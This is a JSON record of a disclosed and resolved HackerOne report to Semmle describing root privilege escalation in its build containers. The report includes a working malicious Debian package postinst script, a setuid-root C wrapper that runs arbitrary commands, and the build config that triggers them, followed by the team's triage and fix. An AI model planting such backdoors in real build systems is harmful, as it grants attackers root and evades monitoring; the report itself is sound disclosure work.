{"id":692603,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82OTI2MDM=","url":"https://hackerone.com/reports/692603","title":"Privilege escalation in workers container ","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-09-11T21:37:46.480Z","submitted_at":"2019-09-11T21:37:46.480Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"testanull","url":"/testanull","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/SF93KjfUXeXdWWFga4q3gwCa/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":27264,"url":"https://hackerone.com/semmle","handle":"semmle","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/027/264/8af1325fdaccc38beab4451ba68ace24623b248c_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/027/264/8af1325fdaccc38beab4451ba68ace24623b248c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Semmle","twitter_handle":"semmle","website":"https://semmle.com","about":"Semmle's engineering analytics platform helps leading technology companies and open-source developers build secure, reliable software."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-09-25T01:31:38.767Z","bug_reporter_agreed_on_going_public_at":"2019-09-25T01:31:38.714Z","team_member_agreed_on_going_public_at":"2019-09-12T15:42:35.400Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary about the bugs:\nIn the prepare step, semmle allows user to install new package.\n\nBy upload a malicious package along with source code and force server to build this package, attacker will gain root access to the container\n\n## Steps:\n\n1. Create a malicious package contains the backdoor:\n\nI use this guide (https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/) to create the package.\n\nWith the content of ``postinst`` is\n\n```\n#!/bin/sh\n\nps -ef\nsudo cp /opt/src/run /suidfs/passwd \u0026\u0026 sudo chown root:root /suidfs/passwd \u0026\u0026 sudo chmod 04755 /suidfs/passwd \u0026\u0026 ln -s /suidfs/passwd /usr/bin/setpasswd \u0026\u0026 setpasswd id \u0026\n\n```\n\nContent of ``/opt/src/run``:\n\n```\n#include \u003cstdio.h\u003e\nvoid main(int argc, char *argv[]) {\n    setreuid(0, 0);\n    system(argv[1]);\n}\n```\nAfter that i will got a malicious ``.deb`` package.\n\n2. Create a config file to install this malicious package:\n\nBecause the source code is imported before the ``prepare`` step happens, so i will be able to install this package by point directly to it like this ``/opt/src/work.deb``.\n\nThe install command now will be like this ``apt install -y --no-recommend /opt/src/work.deb``. And it is ``legal``.\n\nThe build config:\n```\nextraction:\n  java:\n    prepare:\n      packages:\n        - /opt/src/work.deb\n    after_prepare:\n      - echo pwned \u003e\u003e /opt/out/snapshot/log/build.log\n      - /usr/bin/setpasswd 'id'\n```\nAfter that the build will failed, and attacker will get root on the container by running the setuid backdoor\n\n## PoC is attached below\n\nThanks \u0026 regard!\n\n## Impact\n\nAttacker will get root access and will be able to dump every sensitive datas in the server!","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":580620,"file_name":"sem4.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Z4ZwkuiUxcWdPc7tL2TdsQzS?response-content-disposition=attachment%3B%20filename%3D%22sem4.PNG%22%3B%20filename%2A%3DUTF-8%27%27sem4.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ5B5ZLR7W%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151814Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDznwDn3DlLBhpUQR2HsgV%2FXq95UR4rgunTAtaALtJfOwIhAPs6S1Tcddn1VigtqMJZu1ze7EJhUESTAidgv9nNGvTkKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwZmyQg19q82eNvWTYq1wPVa9iL33aSnxoe9uhB7r2aVM0UjDJv7L7h4wpacx0zTD7Cg8zZaNStfUkAQ4PRdT1iVaYXFqr3oEtcRoGLKhag7I7AYV4CfabHIx%2FljtUdbse7EzqrV%2BLQvKbTG6z1i6zNoig4BjAmqV%2BbJNhSJroBCOPElku0SEqEghibUoxjbjpR4CBXjTIJwAUpnCgLLy91sSgp9KNeTgb1AkQk9PEiYIt%2BjjRn7YHGTo0lsLEhUWc0hsx6VLMRCiSyU6pMLzMGyTS6q7VECFtTn5Z0xG6cXCTKHB3pYQ1zLLYN8ml68bLOIBj9DG3soHxXVeXkifKnxu13VQyp3%2Fs7gxFDt1C7HjJ71usGGrh%2BfYBJJFBMGndfS1DoK%2Bopk8YhA2hlX3szEJmyZfm0KUVaG%2FoWbCJlR3fqXIBJ1cKXRlMooUSiLaTSXt07k2ZqF9w0HUl1IdVQzbNbJBH%2BnkPxpioMdR%2BthDqTyEJ4NZO1WuIxKWGZYyMyXsZaWNopcb1ntUTbg6h9jL8PBR4KRpM%2FHAsw70cht3GV%2BEt83AJHQMRTRifsEIkEWjFR47llnjXkbbepxcng%2ByfEEKZRp237bvaIzCz%2FOBASo1zhQretKmelA0U4%2BEADJwrI3hIwr4yRiwY6pAEjctaIC5qKHFIiVu1bdWXuftBXGyVKZyt2TIP%2B2%2FEEDUKSn7h674C0WnV7bDgpkWP3Jm2QA8%2B4oAW2qew892kEhCJxDwZz%2BXR81EJw6%2FG5A5FZJ8bUl63WLiuBkwA0Dx%2Bf%2FkeTcR6awW4gpgHN5q2%2B02FvrdW8HWnLO9b%2FdddTJiHpMjGB2dteCQWg1L0LIQ%2FyL7kCQpQu%2F5PLB76pfiUetgXbFQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4425df57a91f45fcb8b058a3e0e718ccf721d716e4495bb5ce982224c51bec1d","file_size":167243,"type":"image/png"}],"allow_singular_disclosure_at":"2019-10-12T15:42:35.458Z","allow_singular_disclosure_after":-63070538.66653085,"singular_disclosure_allowed":true,"vote_count":202,"voters":["sebd","qdoan95","kapytein","mashoud1122","0xbeefed","sameerphad72","yeuchimse","spam404","fpatrik","ta8ahi","and 192 more..."],"severity":{"rating":"high","author_type":"Team"},"structured_scope":{"databaseId":8552,"asset_type":"URL","asset_identifier":"lgtm-com.pentesting.semmle.net","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5790183,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-09-12T09:56:20.289Z","updated_at":"2019-09-12T09:56:20.289Z","additional_data":{"old_severity":"Critical (9.8)","new_severity":"High","old_severity_id":513847,"new_severity_id":514900},"actor":{"username":"chrisgavin","cleared":false,"url":"/chrisgavin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/259/787/73e7651e088896c2379249d5752999800fc9c2c6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5790231,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi,\n\nThanks very much for your report. We've managed to reproduce the vulnerability and are currently working on a fix.\n\nOur builds run in a container, so gaining root does not result in the full computerize of our builds machines, however we've set the severity of the vulnerability to high on the basis of three different security implications we identified as a result of this report:\n\n1. Our abuse monitoring relies on the fact that untrusted code runs as the `semmle-build` user. By escalating to root within the container you can potentially avoid our abuse detection.\n2. Processes running outside the container are reliant on being able to delete files created by the build. By escalating to root you can potentially create files that the processes running outside the container do not have permission to delete, thereby causing a denial of service for the build machine your malicious build was run on.\n3. We run builds as non-root as part of a multi-layered defense against container escape. By escalating to root, you bypass the first layer in this defense and get closer to being able to access the machine the build ran on.\n\nWe're going to award $750 as a result of this being a high severity vulnerability. We also recognize that this report took a significant amount of manual work to produce, involving learning how our product works and where its weaknesses might be. Because of this we're also awarding a $750 bonus for the research and creativity that went into crafting this exploit.\n\nThanks,\nChris","automated_response":false,"created_at":"2019-09-12T10:13:03.135Z","updated_at":"2019-09-12T10:13:03.135Z","actor":{"username":"chrisgavin","cleared":false,"url":"/chrisgavin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/259/787/73e7651e088896c2379249d5752999800fc9c2c6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5790234,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2019-09-12T10:13:45.232Z","updated_at":"2019-09-12T10:13:45.232Z","actor":{"url":"/semmle","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/027/264/8af1325fdaccc38beab4451ba68ace24623b248c_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Semmle"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"750.0","genius_execution_id":null,"team_handle":"semmle","collaborator":{"username":"testanull","url":"/testanull"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5790361,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you!","automated_response":false,"created_at":"2019-09-12T10:21:11.994Z","updated_at":"2019-09-12T10:21:11.994Z","actor":{"username":"testanull","cleared":false,"url":"/testanull","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/SF93KjfUXeXdWWFga4q3gwCa/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5790382,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can I make this report public?","automated_response":false,"created_at":"2019-09-12T10:25:46.451Z","updated_at":"2019-09-12T10:25:46.451Z","actor":{"username":"testanull","cleared":false,"url":"/testanull","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/SF93KjfUXeXdWWFga4q3gwCa/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5792280,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi,\n\nI'm happy to report that the fix for this issue has now been deployed. We now implement stricter validation of what packages are allowed to be passed to `apt-get`, which should prevent installing malicious packages from files and instead only allow installing packages from trusted repositories.\n\nThank you again for your report, we're happy to disclose it now it's resolved.\n\nThanks,\nChris","automated_response":false,"created_at":"2019-09-12T15:42:08.773Z","updated_at":"2019-09-12T15:42:08.773Z","actor":{"username":"chrisgavin","cleared":false,"url":"/chrisgavin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/259/787/73e7651e088896c2379249d5752999800fc9c2c6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"testanull","url":"/testanull"},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5792287,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-09-12T15:42:35.424Z","updated_at":"2019-09-12T15:42:35.424Z","first_to_agree":true,"actor":{"username":"chrisgavin","cleared":false,"url":"/chrisgavin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/259/787/73e7651e088896c2379249d5752999800fc9c2c6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5882830,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-09-25T01:31:38.732Z","updated_at":"2019-09-25T01:31:38.732Z","actor":{"username":"testanull","cleared":false,"url":"/testanull","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/SF93KjfUXeXdWWFga4q3gwCa/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5882831,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-09-25T01:31:38.783Z","updated_at":"2019-09-25T01:31:38.783Z","actor":{"username":"testanull","cleared":false,"url":"/testanull","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/SF93KjfUXeXdWWFga4q3gwCa/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"semmle","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}